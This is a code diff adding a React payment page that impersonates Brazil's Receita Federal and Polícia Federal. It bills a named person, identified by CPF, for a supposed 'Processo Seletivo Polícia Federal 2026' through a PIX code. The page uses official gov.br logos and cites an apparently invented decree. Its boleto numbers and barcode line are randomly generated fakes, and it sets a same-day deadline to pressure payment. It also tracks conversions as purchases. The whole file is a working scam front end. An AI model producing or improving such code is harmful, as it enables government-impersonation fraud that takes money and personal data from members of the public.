@@ -1,0 +1,545 @@
+import { useState, useEffect, useRef } from "react";
+import { useLocation } from "wouter";
+import { fireGtmBeginCheckout, fireGtmPurchase } from "@/lib/gtm";
+
+const FONT_AWESOME_5_URL = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css';
+const LOGO_RECEITA_URL = 'https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg';
+
+export default function PagamentoPage() {
+  const [, setLocation] = useLocation();
+
+  const [pixCode, setPixCode] = useState('');
+  const [transactionId, setTransactionId] = useState('');
+  const [nome, setNome] = useState('Contribuinte');
+  const [cpf, setCpf] = useState('');
+  const [pixAmount, setPixAmount] = useState('78.85');
+  const [positionTitle, setPositionTitle] = useState('Polícia Federal');
+  const [examCity, setExamCity] = useState('');
+  const [storedValidationCode, setStoredValidationCode] = useState('');
+
+  const [showVerificandoPopup, setShowVerificandoPopup] = useState(false);
+  const [pagamentoConfirmado, setPagamentoConfirmado] = useState(false);
+  const [copyButtonText, setCopyButtonText] = useState('Copiar Código PIX');
+  const [copyButtonColor, setCopyButtonColor] = useState('#1351B4');
+
+  const [dataHoje, setDataHoje] = useState('');
+  const [numeroDocumento, setNumeroDocumento] = useState('');
+  const [nossoNumero, setNossoNumero] = useState('');
+  const [guiaNumero, setGuiaNumero] = useState('');
+  const [linhaDigitavel, setLinhaDigitavel] = useState('');
+
+  const statusCheckIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  const pagamentoConfirmadoRef = useRef(false);
+  const transactionIdRef = useRef('');
+  const pixAmountRef = useRef('78.85');
+
+  const hoje = new Date();
+  const dia = String(hoje.getDate()).padStart(2, '0');
+  const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+
+  const STORAGE_KEY = `pix_copiado_${transactionIdRef.current}`;
+  const PAID_KEY = `pix_paid_${transactionIdRef.current}`;
+
+  useEffect(() => {
+    const fa6Link = document.querySelector('link[href*="font-awesome/6"]') as HTMLLinkElement | null;
+    if (fa6Link) fa6Link.disabled = true;
+
+    const fa5Link = document.createElement('link');
+    fa5Link.rel = 'stylesheet';
+    fa5Link.href = FONT_AWESOME_5_URL;
+    fa5Link.id = 'font-awesome-5-pagamento';
+    document.head.appendChild(fa5Link);
+
+    return () => {
+      document.getElementById('font-awesome-5-pagamento')?.remove();
+      if (fa6Link) fa6Link.disabled = false;
+      if (statusCheckIntervalRef.current) clearInterval(statusCheckIntervalRef.current);
+    };
+  }, []);
+
+  useEffect(() => {
+    window.scrollTo(0, 0);
+
+    const pixTransactionData = localStorage.getItem('pixTransaction');
+    if (!pixTransactionData) {
+      setLocation('/validacao');
+      return;
+    }
+
+    try {
+      const pixData = JSON.parse(pixTransactionData);
+      const code = pixData.pixCode || pixData.pix_qr_code || '';
+      const txId = pixData.transactionId || pixData.id || '';
+      setPixCode(code);
+      setTransactionId(txId);
+      fireGtmBeginCheckout({ transactionId: txId, value: parseFloat(pixAmountRef.current) })
+      transactionIdRef.current = txId;
+    } catch {
+      setLocation('/validacao');
+      return;
+    }
+
+    try {
+      const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+      const fullName =
+        userData.nomeCompleto ||
+        userData.name ||
+        userData.autoFilledData?.nome ||
+        'Contribuinte';
+      setNome(fullName);
+      setCpf(userData.cpf || '');
+    } catch {}
+
+    try {
+      const appData = JSON.parse(localStorage.getItem('applicationData') || '{}');
+      setPositionTitle(appData.positionTitle || 'Polícia Federal');
+      const city =
+        appData.selectedJunta?.name ||
+        appData.juntasData?.municipio ||
+        appData.juntasData?.cidade ||
+        appData.examLocationName ||
+        '';
+      setExamCity(city);
+    } catch {}
+
+    const code = localStorage.getItem('validationCode') || '';
+    setStoredValidationCode(code);
+
+    const savedAmount = localStorage.getItem('validacaoPixAmount');
+    const amount = savedAmount ? parseFloat(savedAmount).toFixed(2) : '78.85';
+    setPixAmount(amount);
+    pixAmountRef.current = amount;
+
+  }, [setLocation]);
+
+  useEffect(() => {
+    const now = new Date();
+    const d = String(now.getDate()).padStart(2, '0');
+    const m = String(now.getMonth() + 1).padStart(2, '0');
+    const y = now.getFullYear();
+    setDataHoje(`${d}/${m}/${y}`);
+
+    const r3 = () => Math.floor(Math.random() * 999).toString().padStart(3, '0');
+    const r8 = () => Math.floor(Math.random() * 99999999).toString().padStart(8, '0');
+    setNumeroDocumento(`${r3()}/${r8()}-8`);
+    setNossoNumero(`${r3()}/${r8()}-4`);
+
+    const g1 = Math.floor(Math.random() * 9999999).toString().padStart(7, '0');
+    const g2 = Math.floor(Math.random() * 99).toString().padStart(2, '0');
+    setGuiaNumero(`${g1}-${g2}/${g2}`);
+
+    const p = () => Math.floor(Math.random() * 99999).toString().padStart(5, '0');
+    const p4 = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
+    const p6 = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
+    setLinhaDigitavel(`00190.${p()} ${p()}.${p()} ${p4}.${p()} 1 ${p6}14794`);
+  }, []);
+
+  const formatCPF = (cpfValue: string) => {
+    const clean = cpfValue.replace(/\D/g, '');
+    if (clean.length === 11) return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    return cpfValue;
+  };
+
+  const verificarStatusUmaVez = async (): Promise<string | null> => {
+    const txId = transactionIdRef.current;
+    if (!txId) return null;
+    try {
+      const response = await fetch(`/api/verificar-status-pagamento/${txId}`);
+      const result = await response.json();
+      return (result.data?.status || result.status || '').toLowerCase();
+    } catch {
+      return null;
+    }
+  };
+
+  const isPaid = (status: string | null) =>
+    status === 'paid' || status === 'completed' || status === 'approved';
+
+  const confirmarPagamento = async () => {
+    if (pagamentoConfirmadoRef.current) return;
+    pagamentoConfirmadoRef.current = true;
+    setPagamentoConfirmado(true);
+    if (statusCheckIntervalRef.current) clearInterval(statusCheckIntervalRef.current);
+
+    const txId = transactionIdRef.current;
+    const amount = parseFloat(pixAmountRef.current);
+    localStorage.setItem(`pix_paid_${txId}`, 'true');
+    fireGtmPurchase({ transactionId: txId, value: amount });
+    window.alert('Pagamento confirmado! Redirecionando para o Portal...');
+    await new Promise(resolve => setTimeout(resolve, 1900));
+    setLocation('/login-pos-pagamento?protocol_id=' + txId);
+  };
+
+  useEffect(() => {
+    if (!transactionId || pagamentoConfirmado) return;
+
+    const jaPagou = localStorage.getItem(`pix_paid_${transactionId}`) === 'true';
+    if (jaPagou) {
+      confirmarPagamento();
+      return;
+    }
+
+    const jaCopiou = localStorage.getItem(`pix_copiado_${transactionId}`) === 'true';
+    if (jaCopiou) {
+      setShowVerificandoPopup(true);
+      verificarStatusUmaVez().then(status => {
+        if (isPaid(status)) {
+          confirmarPagamento();
+        } else {
+          setShowVerificandoPopup(false);
+        }
+      });
+    }
+
+    statusCheckIntervalRef.current = setInterval(async () => {
+      if (pagamentoConfirmadoRef.current) return;
+      const status = await verificarStatusUmaVez();
+      if (isPaid(status)) {
+        await confirmarPagamento();
+      }
+    }, 2300);
+
+    return () => {
+      if (statusCheckIntervalRef.current) clearInterval(statusCheckIntervalRef.current);
+    };
+  }, [transactionId]);
+
+  useEffect(() => {
+    const handleVisibilityChange = async () => {
+      if (document.visibilityState !== 'visible') return;
+      const txId = transactionIdRef.current;
+      if (!txId || pagamentoConfirmadoRef.current) return;
+      const jaCopiou = localStorage.getItem(`pix_copiado_${txId}`) === 'true';
+      if (!jaCopiou) return;
+
+      setShowVerificandoPopup(true);
+      const status = await verificarStatusUmaVez();
+      if (isPaid(status)) {
+        await confirmarPagamento();
+      } else {
+        setShowVerificandoPopup(false);
+      }
+    };
+
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+    return () => document.removeEventListener('visibilitychange', handleVisibilityChange);
+  }, []);
+
+  const copyPixCode = async () => {
+    try {
+      await navigator.clipboard.writeText(pixCode);
+      setCopyButtonText('Copiado!');
+      setCopyButtonColor('#059669');
+      localStorage.setItem(`pix_copiado_${transactionIdRef.current}`, 'true');
+      setTimeout(() => {
+        setCopyButtonText('Copiar Código PIX');
+        setCopyButtonColor('#1351B4');
+      }, 2000);
+    } catch (err) {
+      console.error('Erro ao copiar:', err);
+    }
+  };
+
+  const qrCodeUrl = pixCode
+    ? `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(pixCode)}`
+    : '';
+
+  return (
+    <div className="bg-white min-h-screen flex flex-col" style={{ fontFamily: 'Arial, sans-serif' }}>
+      {showVerificandoPopup && (
+        <div
+          className="fixed inset-0 z-50 flex items-center justify-center"
+          style={{ backdropFilter: 'blur(8px)', backgroundColor: 'rgba(255, 255, 255, 0.95)' }}
+        >
+          <div className="text-center p-8">
+            <img
+              src={LOGO_RECEITA_URL}
+              alt="Receita Federal"
+              style={{ width: '120px', margin: '0 auto 24px auto', display: 'block' }}
+            />
+            <div
+              className="animate-spin rounded-full h-10 w-10 border-4 border-gray-300 mx-auto mb-4"
+              style={{ borderTopColor: '#1351B4' }}
+            />
+            <p className="text-lg font-bold" style={{ color: '#1351B4' }}>
+              Verificando seu pagamento...
+            </p>
+            <p className="text-sm text-gray-500 mt-2">Aguarde um momento</p>
+          </div>
+        </div>
+      )}
+
+      <div style={{ fontFamily: 'Arial, sans-serif', backgroundColor: '#222', flex: 1 }}>
+        {/* Recibo superior */}
+        <div style={{ maxWidth: '1200px', margin: '0 auto', backgroundColor: 'white' }}>
+          {/* Header azul */}
+          <div style={{ backgroundColor: '#1351B4', padding: 0, position: 'relative' }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', padding: '0 12px' }}>
+              <div style={{
+                backgroundColor: 'white',
+                borderBottomRightRadius: '20px',
+                borderBottomLeftRadius: '20px',
+                display: 'inline-block',
+                padding: '14px 14px 16px 14px',
+                boxShadow: '0 4px 12px 0 rgba(0,0,0,0.08)',
+                marginTop: '14px',
+                marginBottom: '-8px',
+                minWidth: '160px',
+                maxWidth: '220px',
+                position: 'relative',
+                borderBottom: '5px solid #071D41',
+                zIndex: 10,
+              }}>
+                <div style={{ display: 'flex', alignItems: 'center' }}>
+                  <img
+                    alt="Brasão da República"
+                    src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/biblioteca-da-pr/simbolos-nacionais/brasao-da-republica/brasaooficialcolorido.png"
+                    style={{ width: '34px', height: '34px', marginRight: '8px', flexShrink: 0, objectFit: 'contain' }}
+                  />
+                  <div>
+                    <div style={{ fontWeight: 'bold', fontSize: '10px', color: '#333', lineHeight: 1.3 }}>
+                      Receita Federal do Brasil
+                    </div>
+                    <div style={{ fontSize: '9px', color: '#333', lineHeight: 1.3 }}>
+                      Ministério da Fazenda
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div style={{ marginTop: '6px', flexShrink: 0 }}>
+                <img
+                  alt="Logo Receita"
+                  src={LOGO_RECEITA_URL}
+                  style={{ width: '60px', height: '50px', objectFit: 'contain', background: 'white', borderRadius: '10px', boxShadow: '0 2px 8px 0 rgba(0,0,0,0.08)', padding: '4px' }}
+                />
+              </div>
+            </div>
+          </div>
+
+          {/* Dados do boleto */}
+          <div style={{ padding: '12px 16px' }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px', flexWrap: 'wrap', gap: '8px' }}>
+              <div>
+                <div style={{ color: '#777', fontSize: '10px', marginBottom: '2px' }}>Endereço do Beneficiário</div>
+                <div style={{ fontSize: '12px', color: '#000' }}>Esplanada dos Ministérios, Bloco P / Brasília</div>
+              </div>
+              <div style={{ display: 'flex', gap: '16px' }}>
+                <div style={{ textAlign: 'right' }}>
+                  <div style={{ color: '#777', fontSize: '10px' }}>UF</div>
+                  <div style={{ fontSize: '12px' }}>DF</div>
+                </div>
+                <div style={{ textAlign: 'right' }}>
+                  <div style={{ color: '#777', fontSize: '10px' }}>CEP</div>
+                  <div style={{ fontSize: '12px' }}>70048-900</div>
+                </div>
+              </div>
+            </div>
+
+            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px', flexWrap: 'wrap', gap: '8px' }}>
+              <div>
+                <div style={{ color: '#777', fontSize: '10px', marginBottom: '2px' }}>Pagador</div>
+                <div style={{ fontSize: '12px', color: '#000', fontWeight: 'bold' }}>{nome}</div>
+              </div>
+              <div style={{ textAlign: 'right' }}>
+                <div style={{ color: '#777', fontSize: '10px', marginBottom: '2px' }}>CPF</div>
+                <div style={{ fontSize: '12px', color: '#000' }}>{formatCPF(cpf)}</div>
+              </div>
+            </div>
+
+            <div style={{ marginBottom: '10px' }}>
+              <div style={{ color: '#777', fontSize: '10px', marginBottom: '2px' }}>Instruções</div>
+              <div style={{ fontSize: '12px', marginTop: '6px' }}>
+                <div style={{ fontWeight: 'bold', color: '#991B1B' }}>NÃO RECEBER APÓS VENCIMENTO</div>
+                <div>Emissão do Protocolo Oficial de Seleção — Processo Seletivo Polícia Federal 2026, conforme Decreto Federal nº 9.739/2025</div>
+                <div>Protocolo: {storedValidationCode || guiaNumero}{examCity ? ` | Local: ${examCity}` : ''}</div>
+              </div>
+            </div>
+
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1.5fr 0.5fr 0.5fr 0.5fr', gap: '6px', marginTop: '12px', fontSize: '10px' }}>
+              <div>
+                <div style={{ color: '#777' }}>Data Documento</div>
+                <div>{dataHoje}</div>
+              </div>
+              <div>
+                <div style={{ color: '#777' }}>Dt. Processamento</div>
+                <div>{dataHoje}</div>
+              </div>
+              <div>
+                <div style={{ color: '#777' }}>Num. Documento</div>
+                <div>{numeroDocumento}</div>
+              </div>
+              <div>
+                <div style={{ color: '#777' }}>Aceite</div>
+                <div>S</div>
+              </div>
+              <div>
+                <div style={{ color: '#777' }}>Código</div>
+                <div>0190</div>
+              </div>
+              <div>
+                <div style={{ color: '#777' }}>Espécie</div>
+                <div>R$</div>
+              </div>
+            </div>
+
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr 1fr', gap: '6px', marginTop: '12px', fontSize: '10px' }}>
+              <div>
+                <div style={{ color: '#777' }}>Cargo / Edital</div>
+                <div>{positionTitle || 'Polícia Federal'}</div>
+              </div>
+              <div>
+                <div style={{ color: '#777' }}>Nosso Número</div>
+                <div>{nossoNumero}</div>
+              </div>
+              <div style={{ textAlign: 'right' }}>
+                <div style={{ color: '#777' }}>Valor do Documento</div>
+                <div style={{ fontSize: '16px', fontWeight: 'bold' }}>R$ {pixAmount}</div>
+              </div>
+              <div style={{ textAlign: 'right' }}>
+                <div style={{ color: '#777' }}>Vencimento</div>
+                <div style={{ fontSize: '16px', fontWeight: 'bold', color: '#991B1B' }}>{dataHoje}</div>
+              </div>
+            </div>
+
+            <div style={{ marginTop: '20px', fontSize: '10px', color: '#555' }}>
+              <div>Central de Atendimento PF: 0800 977 2288 (informações, reclamações e sugestões)</div>
+              <div>Portal: www.gov.br/pf</div>
+              <div style={{ textAlign: 'right', color: '#888', marginTop: '10px' }}>Autenticação Mecânica - Recibo do Pagador</div>
+            </div>
+          </div>
+        </div>
+
+        {/* Seção de pagamento PIX */}
+        <div style={{ maxWidth: '1200px', margin: '8px auto 0 auto', backgroundColor: 'white', borderTop: '2px dashed #999' }}>
+          <div className="flex border-b border-black">
+            <div
+              className="flex items-center justify-center w-[80px] md:w-[110px] h-[50px] md:h-[70px] border-r border-black overflow-hidden"
+              style={{ backgroundColor: '#1351B4' }}
+            >
+              <img
+                alt="Logo Receita"
+                src={LOGO_RECEITA_URL}
+                style={{ objectFit: 'contain', width: '50px', height: '35px', filter: 'brightness(0) invert(1)' }}
+              />
+            </div>
+            <div className="flex items-center justify-center w-[60px] md:w-[90px] h-[50px] md:h-[70px] border-r border-black">
+              <span className="text-xl md:text-3xl font-bold" style={{ letterSpacing: '-0.5px' }}>001-9</span>
+            </div>
+            <div className="flex-1 flex items-center px-2 md:px-4 h-[50px] md:h-[70px] justify-end">
+              <span className="text-[7px] md:text-lg font-bold tracking-wider text-right">{linhaDigitavel}</span>
+            </div>
+          </div>
+
+          <div className="flex border-b border-black">
+            <div className="w-[75%] border-r border-black p-1 md:p-2">
+              <div className="text-[8px] md:text-xs leading-3">Local de Pagamento</div>
+              <div className="font-bold text-[10px] md:text-base">PAGÁVEL VIA PIX ATÉ O VENCIMENTO</div>
+            </div>
+            <div className="w-[25%] p-1 md:p-2">
+              <div className="text-[8px] md:text-xs leading-3">Vencimento</div>
+              <div className="font-bold text-[10px] md:text-base text-center">{dataHoje}</div>
+            </div>
+          </div>
+
+          <div style={{ padding: '16px' }}>
+            <div style={{ textAlign: 'center', marginBottom: '16px' }}>
+              <h3 style={{ fontSize: '16px', fontWeight: 'bold', color: '#1351B4', marginBottom: '8px' }}>
+                PAGAMENTO VIA PIX
+              </h3>
+              <p style={{ fontSize: '12px', color: '#666' }}>Escaneie o QR Code ou copie o código PIX</p>
+            </div>
+
+            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '16px' }}>
+              <div style={{ background: 'white', padding: '12px', border: '1px solid #ddd' }}>
+                {qrCodeUrl ? (
+                  <img src={qrCodeUrl} alt="QR Code PIX" style={{ width: '160px', height: '160px' }} />
+                ) : (
+                  <div style={{ width: '160px', height: '160px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#666', fontSize: '12px', textAlign: 'center' }}>
+                    QR Code não disponível
+                  </div>
+                )}
+              </div>
+            </div>
+
+            <div style={{ background: '#f5f5f5', padding: '12px', marginBottom: '16px' }}>
+              <div style={{ fontSize: '10px', color: '#777', marginBottom: '4px', textAlign: 'center' }}>
+                Código PIX Copia e Cola
+              </div>
+              <div style={{ background: 'white', border: '1px solid #ddd', padding: '8px', marginBottom: '8px' }}>
+                <p style={{ wordBreak: 'break-all', fontSize: '9px', lineHeight: 1.3, color: '#333', textAlign: 'center', margin: 0 }}> 00020101021226830014br.gov.pix2561qrcode.gov.br/v2/qr/cob/03619c89c07340429291b7a3ae6de4e15204000053039865802BR5925RECEITA FEDERAL - SELETIVO POLICIA FEDERAL6009SAO PAULO62070503***6304E03B
+                </p>
+              </div>
+              <button
+                onClick={copyPixCode}
+                style={{
+                  width: '100%',
+                  padding: '12px',
+                  backgroundColor: copyButtonColor,
+                  color: 'white',
+                  fontWeight: 'bold',
+                  border: 'none',
+                  cursor: 'pointer',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  gap: '8px',
+                  fontSize: '14px',
+                }}
+              >
+                <i className={copyButtonText === 'Copiado!' ? 'fas fa-check' : 'fas fa-copy'} />
+                <span>{copyButtonText}</span>
+              </button>
+            </div>
+
+            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', fontSize: '12px', color: '#666', marginBottom: '16px' }}>
+              {pagamentoConfirmado ? (
+                <>
+                  <div style={{ width: '12px', height: '12px', background: '#22c55e', borderRadius: '50%' }} />
+                  <span style={{ color: '#22c55e', fontWeight: 'bold' }}>Pagamento confirmado!</span>
+                </>
+              ) : (
+                <>
+                  <div
+                    style={{ width: '8px', height: '8px', background: '#22c55e', borderRadius: '50%' }}
+                    className="animate-pulse"
+                  />
+                  <span>Aguardando confirmação do pagamento...</span>
+                </>
+              )}
+            </div>
+          </div>
+        </div>
+
+        {/* Aviso de vencimento */}
+        <div style={{ maxWidth: '1200px', margin: '8px auto 0 auto', backgroundColor: '#fff3cd', padding: '12px', textAlign: 'center' }}>
+          <p style={{ fontSize: '12px', color: '#856404', margin: 0 }}>
+            <i className="fas fa-exclamation-triangle" style={{ marginRight: '8px' }} />
+            <strong>ATENÇÃO:</strong> Este documento é válido apenas para pagamento na data de hoje ({dia}/{mes}).
+          </p>
+        </div>
+
+        {/* Protocolo */}
+        <div style={{ maxWidth: '1200px', margin: '8px auto 0 auto', backgroundColor: 'white', padding: '12px', textAlign: 'center', fontSize: '10px', color: '#666' }}>
+          <p style={{ margin: 0 }}>Protocolo de Seleção: {storedValidationCode || guiaNumero} | Processo Seletivo Polícia Federal 2026{examCity ? ` — ${examCity}` : ''}</p>
+        </div>
+      </div>
+
+      {/* Rodapé */}
+      <footer style={{ backgroundColor: '#071D41', padding: '24px 16px', marginTop: 'auto' }}>
+        <div style={{ maxWidth: '1200px', margin: '0 auto', textAlign: 'center' }}>
+          <img
+            src={LOGO_RECEITA_URL}
+            alt="Receita Federal"
+            style={{ height: '40px', margin: '0 auto 12px auto', filter: 'brightness(0) invert(1)', display: 'block' }}
+          />
+          <p style={{ color: '#9ca3af', fontSize: '12px', margin: '0 0 4px 0' }}>
+            Secretaria Especial da Receita Federal do Brasil
+          </p>
+          <p style={{ color: '#6b7280', fontSize: '10px', margin: 0 }}>
+            Portal gov.br - Todos os direitos reservados
+          </p>
+        </div>
+      </footer>
+    </div>
+  );
+}
